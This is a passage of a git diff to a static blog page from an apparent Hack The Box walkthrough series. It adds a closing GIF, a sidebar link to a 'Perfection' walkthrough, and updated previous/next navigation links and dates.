+        lifeLike:  false ,
+        startDelay:  0 ,
+        breakLines:  true ,
+        waitUntilVisible:  true ,
+        loop:  false 
+      }).go();
+    });
+</script>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/ORShRT5zN1MAAAAC/we%27ll-see-you-next-time-samus-paulicelli.gif" alt="end" />
+    
+  </figure>
+</p>
 
           
           
@@ -1374,6 +1660,15 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
         <a href="http://localhost:1313/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
             Part 3: Caption Walkthrough(HTB)
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
+            Part 4: Perfection Walkthrough(HTB)
         </a>
     </div>
     
@@ -1560,7 +1855,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/Secure-The-Throne/posts/1741592170890-backend-walkthroughhtb/">
+            <a class="flex group mr-3" href="/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1572,11 +1867,11 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Backend Walkthrough(HTB)</span
+                  >Caption Walkthrough(HTB)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-10T00:00:00&#43;00:00">10 March 2025</time>
+                    <time datetime="2025-03-12T00:00:00&#43;00:00">12 March 2025</time>
                   
                 </span>
               </span>
@@ -1585,15 +1880,15 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
+            <a class="flex text-right group ml-3" href="/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Caption Walkthrough(HTB)</span
+                  >Perfection Walkthrough(HTB)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-12T00:00:00&#43;00:00">12 March 2025</time>
+                    <time datetime="2025-03-14T00:00:00&#43;00:00">14 March 2025</time>
                   
                 </span>
               </span>
